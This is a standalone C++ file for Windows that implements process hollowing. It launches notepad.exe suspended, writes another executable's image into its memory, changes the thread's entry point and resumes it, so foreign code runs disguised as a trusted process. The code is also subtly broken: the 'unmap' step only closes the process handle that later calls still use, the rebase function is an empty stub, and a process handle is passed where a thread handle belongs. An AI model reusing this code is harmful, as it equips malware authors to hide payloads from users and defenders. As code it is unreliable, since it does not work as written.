#include <Windows.h>
#include <iostream>

BOOL UPM(HANDLE h);
BOOL IE(HANDLE hp, const char* p);
BOOL REB(HANDLE hP, PVOID n);
BOOL SEP(HANDLE hp, PVOID e);

int main() {
    STARTUPINFO s = {sizeof(s)};
    PROCESS_INFORMATION p;
    char pp[] = "C:\\Windows\\System32\\notepad.exe";

    if (!CreateProcess(NULL, pp, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &s, &p)) {
        std::cerr << "[+] CreateProcess failed: " << GetLastError() << std::endl;
        return 1;
    }

    if (!UPM(p.hProcess)) {
        std::cerr << "[+] Failed to unmap process memory" << std::endl;
        return 1;
    }

    if (!IE(p.hProcess, "C:\\Path\\To\\Your\\Executable.exe")) {
        std::cerr << "[+] Failed to inject executable" << std::endl;
        return 1;
    }

    if (!REB(p.hProcess, (PVOID)0x400000)) {
        std::cerr << "[+] Failed to rebase executable" << std::endl;
        return 1;
    }

    if (!SEP(p.hProcess, (PVOID)0x401000)) {
        std::cerr << "[+] Failed to set entry point" << std::endl;
        return 1;
    }

    ResumeThread(p.hThread);

    CloseHandle(p.hProcess);
    CloseHandle(p.hThread);

    return 0;
}

BOOL UPM(HANDLE h) {
    CloseHandle(h);
    return TRUE;
}

BOOL IE(HANDLE hp, const char* p) {
    HANDLE hf = CreateFile(p, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hf == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    HANDLE hm = CreateFileMapping(hf, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (hm == NULL) {
        CloseHandle(hf);
        return FALSE;
    }

    PVOID i = MapViewOfFile(hm, FILE_MAP_READ, 0, 0, 0);
    if (i == NULL) {
        CloseHandle(hm);
        CloseHandle(hf);
        return FALSE;
    }

    PIMAGE_DOS_HEADER d = (PIMAGE_DOS_HEADER)i;
    PIMAGE_NT_HEADERS n = (PIMAGE_NT_HEADERS)((BYTE*)i + d->e_lfanew);
    SIZE_T s = n->OptionalHeader.SizeOfImage;

    if (!WriteProcessMemory(hp, (LPVOID)n->OptionalHeader.ImageBase, i, s, NULL)) {
        UnmapViewOfFile(i);
        CloseHandle(hm);
        CloseHandle(hf);
        return FALSE;
    }

    UnmapViewOfFile(i);
    CloseHandle(hm);
    CloseHandle(hf);
    return TRUE;
}

BOOL REB(HANDLE h, PVOID n) {
    return TRUE;
}

BOOL SEP(HANDLE hp, PVOID e) {
    CONTEXT c;
    c.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(hp, &c)) {
        return FALSE;
    }

    c.Eax = (DWORD)e;

    if (!SetThreadContext(hp, &c)) {
        return FALSE;
    }

    return TRUE;
}
